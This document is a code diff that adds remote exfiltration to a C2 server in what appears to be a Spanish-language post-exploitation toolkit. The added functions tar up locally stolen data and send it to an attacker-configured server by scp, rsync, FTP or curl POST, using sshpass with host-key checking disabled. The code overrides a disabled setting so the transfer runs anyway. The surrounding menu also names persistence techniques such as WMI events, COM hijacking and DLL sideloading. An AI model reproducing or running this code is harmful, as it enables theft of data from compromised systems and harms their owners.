@@ -9,7 +9,7 @@ import time
 import threading
 from typing import Dict, List, Any, Optional
 from pathlib import Path
-from modules.logging_system import LoggingSystem
+from modules.logging_system import LoggingSystem, Colors
 
 class PostExecutionTasksModule:
     """Módulo de tareas post-ejecución para procedimientos extensos"""
@@ -42,7 +42,7 @@ class PostExecutionTasksModule:
             self._display_post_execution_menu()
             
             try:
-                choice = input(f"{Colors.YELLOW}Seleccione una tarea (1-8): {Colors.END}").strip()
+                choice = input(f"{Colors.YELLOW}Seleccione una tarea (1-9): {Colors.END}").strip()
                 
                 if choice == '1':
                     self._run_deep_network_scan()
@@ -55,10 +55,12 @@ class PostExecutionTasksModule:
                 elif choice == '5':
                     self._run_comprehensive_data_exfiltration()
                 elif choice == '6':
-                    self._run_advanced_persistence()
+                    self._run_remote_exfiltration()
                 elif choice == '7':
-                    self._run_network_mapping()
+                    self._run_advanced_persistence()
                 elif choice == '8':
+                    self._run_network_mapping()
+                elif choice == '9':
                     break
                 else:
                     print(f"{Colors.RED}❌ Opción inválida{Colors.END}")
@@ -89,13 +91,16 @@ class PostExecutionTasksModule:
         print(f"{Colors.CYAN}5. 📤 Exfiltración comprehensiva de datos{Colors.END}")
         print(f"   {Colors.WHITE}Búsqueda exhaustiva de datos sensibles{Colors.END}")
         
-        print(f"{Colors.CYAN}6. 🔒 Persistencia avanzada{Colors.END}")
+        print(f"{Colors.CYAN}6. 🌐 Exfiltración remota a servidor C2{Colors.END}")
+        print(f"   {Colors.WHITE}Enviar datos exfiltrados a servidor remoto{Colors.END}")
+        
+        print(f"{Colors.CYAN}7. 🔒 Persistencia avanzada{Colors.END}")
         print(f"   {Colors.WHITE}WMI events, COM hijacking, DLL sideloading{Colors.END}")
         
-        print(f"{Colors.CYAN}7. 🗺️ Mapeo completo de red{Colors.END}")
+        print(f"{Colors.CYAN}8. 🗺️ Mapeo completo de red{Colors.END}")
         print(f"   {Colors.WHITE}Topología detallada, relaciones entre sistemas{Colors.END}")
         
-        print(f"{Colors.CYAN}8. ❌ Volver{Colors.END}")
+        print(f"{Colors.CYAN}9. ❌ Volver{Colors.END}")
     
     def _run_deep_network_scan(self) -> None:
         """Ejecutar escaneo profundo de red"""
@@ -651,3 +656,255 @@ class PostExecutionTasksModule:
         """Mapear vulnerabilidades de red"""
         # Implementar mapeo de vulnerabilidades
         return {}
+    
+    def _run_remote_exfiltration(self) -> None:
+        """Ejecutar exfiltración remota a servidor C2"""
+        self.logger.info("🌐 INICIANDO EXFILTRACIÓN REMOTA A SERVIDOR C2")
+        
+        try:
+            # Verificar configuración remota
+            remote_config = self.config.get('exfiltration', {}).get('remote_options', {})
+            
+            if not remote_config.get('enabled', False):
+                print(f"{Colors.YELLOW}⚠️ Exfiltración remota no habilitada en configuración{Colors.END}")
+                print(f"{Colors.WHITE}Habilitando temporalmente para esta operación...{Colors.END}")
+                remote_config['enabled'] = True
+            
+            # Obtener datos exfiltrados locales
+            local_exfiltration_dir = Path("./exfiltrated_data")
+            if not local_exfiltration_dir.exists():
+                print(f"{Colors.RED}❌ No se encontraron datos exfiltrados localmente{Colors.END}")
+                print(f"{Colors.WHITE}Ejecute primero la exfiltración comprehensiva{Colors.END}")
+                return
+            
+            # Configurar conexión remota
+            remote_server = remote_config.get('remote_server', '')
+            remote_user = remote_config.get('remote_user', '')
+            remote_password = remote_config.get('remote_password', '')
+            remote_path = remote_config.get('remote_path', '/tmp/exfiltrated_data')
+            transfer_methods = remote_config.get('transfer_methods', ['scp'])
+            
+            if not all([remote_server, remote_user, remote_password]):
+                print(f"{Colors.RED}❌ Configuración remota incompleta{Colors.END}")
+                return
+            
+            print(f"{Colors.BLUE}📤 Enviando datos a servidor remoto: {remote_user}@{remote_server}{Colors.END}")
+            print(f"{Colors.WHITE}Destino: {remote_path}{Colors.END}")
+            
+            # Crear directorio remoto
+            self._create_remote_directory(remote_server, remote_user, remote_password, remote_path)
+            
+            # Transferir datos
+            transfer_results = []
+            for method in transfer_methods:
+                result = self._transfer_data(method, local_exfiltration_dir, remote_server, 
+                                           remote_user, remote_password, remote_path)
+                transfer_results.append(result)
+                
+                if result['success']:
+                    print(f"{Colors.GREEN}✅ Transferencia exitosa con {method}{Colors.END}")
+                    break
+                else:
+                    print(f"{Colors.YELLOW}⚠️ Falló transferencia con {method}: {result['error']}{Colors.END}")
+            
+            # Verificar transferencia exitosa
+            successful_transfers = [r for r in transfer_results if r['success']]
+            if successful_transfers:
+                print(f"{Colors.GREEN}🎉 Exfiltración remota completada exitosamente{Colors.END}")
+                print(f"{Colors.WHITE}Datos enviados a: {remote_user}@{remote_server}:{remote_path}{Colors.END}")
+                
+                # Log de la operación
+                self.logging_system.log_discovery(
+                    "REMOTE_EXFILTRATION", remote_server, {
+                        'method': successful_transfers[0]['method'],
+                        'files_transferred': successful_transfers[0]['files_count'],
+                        'total_size': successful_transfers[0]['total_size'],
+                        'remote_path': remote_path,
+                        'timestamp': time.time()
+                    }, "POST_EXECUTION"
+                )
+            else:
+                print(f"{Colors.RED}❌ Todas las transferencias fallaron{Colors.END}")
+                
+        except Exception as e:
+            self.logger.error(f"Error en exfiltración remota: {e}")
+            print(f"{Colors.RED}❌ Error en exfiltración remota: {e}{Colors.END}")
+    
+    def _create_remote_directory(self, server: str, user: str, password: str, path: str) -> bool:
+        """Crear directorio remoto"""
+        try:
+            # Usar SSH para crear directorio
+            command = ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', 
+                      f'{user}@{server}', f'mkdir -p {path}']
+            
+            result = subprocess.run(command, capture_output=True, text=True, timeout=30)
+            return result.returncode == 0
+            
+        except Exception as e:
+            self.logger.error(f"Error creando directorio remoto: {e}")
+            return False
+    
+    def _transfer_data(self, method: str, local_dir: Path, server: str, user: str, 
+                      password: str, remote_path: str) -> Dict[str, Any]:
+        """Transferir datos usando método específico"""
+        try:
+            if method == 'scp':
+                return self._transfer_with_scp(local_dir, server, user, password, remote_path)
+            elif method == 'rsync':
+                return self._transfer_with_rsync(local_dir, server, user, password, remote_path)
+            elif method == 'ftp':
+                return self._transfer_with_ftp(local_dir, server, user, password, remote_path)
+            elif method == 'http':
+                return self._transfer_with_http(local_dir, server, user, password, remote_path)
+            else:
+                return {'success': False, 'error': f'Método {method} no soportado'}
+                
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def _transfer_with_scp(self, local_dir: Path, server: str, user: str, 
+                          password: str, remote_path: str) -> Dict[str, Any]:
+        """Transferir datos con SCP"""
+        try:
+            # Crear archivo tar comprimido
+            tar_file = local_dir.parent / f"exfiltrated_data_{int(time.time())}.tar.gz"
+            tar_command = ['tar', '-czf', str(tar_file), '-C', str(local_dir.parent), local_dir.name]
+            
+            result = subprocess.run(tar_command, capture_output=True, text=True, timeout=60)
+            if result.returncode != 0:
+                return {'success': False, 'error': 'Error creando archivo tar'}
+            
+            # Transferir con SCP
+            scp_command = ['sshpass', '-p', password, 'scp', '-o', 'StrictHostKeyChecking=no',
+                          str(tar_file), f'{user}@{server}:{remote_path}/']
+            
+            result = subprocess.run(scp_command, capture_output=True, text=True, timeout=300)
+            
+            # Limpiar archivo temporal
+            tar_file.unlink(missing_ok=True)
+            
+            if result.returncode == 0:
+                return {
+                    'success': True,
+                    'method': 'scp',
+                    'files_count': len(list(local_dir.rglob('*'))),
+                    'total_size': sum(f.stat().st_size for f in local_dir.rglob('*') if f.is_file())
+                }
+            else:
+                return {'success': False, 'error': result.stderr}
+                
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def _transfer_with_rsync(self, local_dir: Path, server: str, user: str, 
+                            password: str, remote_path: str) -> Dict[str, Any]:
+        """Transferir datos con RSYNC"""
+        try:
+            # Configurar SSH para rsync
+            ssh_command = f'sshpass -p {password} ssh -o StrictHostKeyChecking=no'
+            
+            rsync_command = [
+                'rsync', '-avz', '--progress',
+                f'--rsh={ssh_command}',
+                f'{local_dir}/',
+                f'{user}@{server}:{remote_path}/'
+            ]
+            
+            result = subprocess.run(rsync_command, capture_output=True, text=True, timeout=600)
+            
+            if result.returncode == 0:
+                return {
+                    'success': True,
+                    'method': 'rsync',
+                    'files_count': len(list(local_dir.rglob('*'))),
+                    'total_size': sum(f.stat().st_size for f in local_dir.rglob('*') if f.is_file())
+                }
+            else:
+                return {'success': False, 'error': result.stderr}
+                
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def _transfer_with_ftp(self, local_dir: Path, server: str, user: str, 
+                          password: str, remote_path: str) -> Dict[str, Any]:
+        """Transferir datos con FTP"""
+        try:
+            # Crear archivo tar comprimido
+            tar_file = local_dir.parent / f"exfiltrated_data_{int(time.time())}.tar.gz"
+            tar_command = ['tar', '-czf', str(tar_file), '-C', str(local_dir.parent), local_dir.name]
+            
+            result = subprocess.run(tar_command, capture_output=True, text=True, timeout=60)
+            if result.returncode != 0:
+                return {'success': False, 'error': 'Error creando archivo tar'}
+            
+            # Transferir con FTP
+            ftp_script = f"""
+open {server}
+user {user} {password}
+binary
+cd {remote_path}
+put {tar_file}
+quit
+"""
+            
+            with open('ftp_script.txt', 'w') as f:
+                f.write(ftp_script)
+            
+            ftp_command = ['ftp', '-n', '-v', '-s:ftp_script.txt']
+            result = subprocess.run(ftp_command, capture_output=True, text=True, timeout=300)
+            
+            # Limpiar archivos temporales
+            tar_file.unlink(missing_ok=True)
+            Path('ftp_script.txt').unlink(missing_ok=True)
+            
+            if result.returncode == 0:
+                return {
+                    'success': True,
+                    'method': 'ftp',
+                    'files_count': len(list(local_dir.rglob('*'))),
+                    'total_size': sum(f.stat().st_size for f in local_dir.rglob('*') if f.is_file())
+                }
+            else:
+                return {'success': False, 'error': result.stderr}
+                
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def _transfer_with_http(self, local_dir: Path, server: str, user: str, 
+                           password: str, remote_path: str) -> Dict[str, Any]:
+        """Transferir datos con HTTP POST"""
+        try:
+            # Crear archivo tar comprimido
+            tar_file = local_dir.parent / f"exfiltrated_data_{int(time.time())}.tar.gz"
+            tar_command = ['tar', '-czf', str(tar_file), '-C', str(local_dir.parent), local_dir.name]
+            
+            result = subprocess.run(tar_command, capture_output=True, text=True, timeout=60)
+            if result.returncode != 0:
+                return {'success': False, 'error': 'Error creando archivo tar'}
+            
+            # Transferir con curl
+            curl_command = [
+                'curl', '-X', 'POST',
+                f'http://{server}/upload',
+                '-u', f'{user}:{password}',
+                '-F', f'file=@{tar_file}',
+                '-F', f'path={remote_path}'
+            ]
+            
+            result = subprocess.run(curl_command, capture_output=True, text=True, timeout=300)
+            
+            # Limpiar archivo temporal
+            tar_file.unlink(missing_ok=True)
+            
+            if result.returncode == 0:
+                return {
+                    'success': True,
+                    'method': 'http',
+                    'files_count': len(list(local_dir.rglob('*'))),
+                    'total_size': sum(f.stat().st_size for f in local_dir.rglob('*') if f.is_file())
+                }
+            else:
+                return {'success': False, 'error': result.stderr}
+                
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
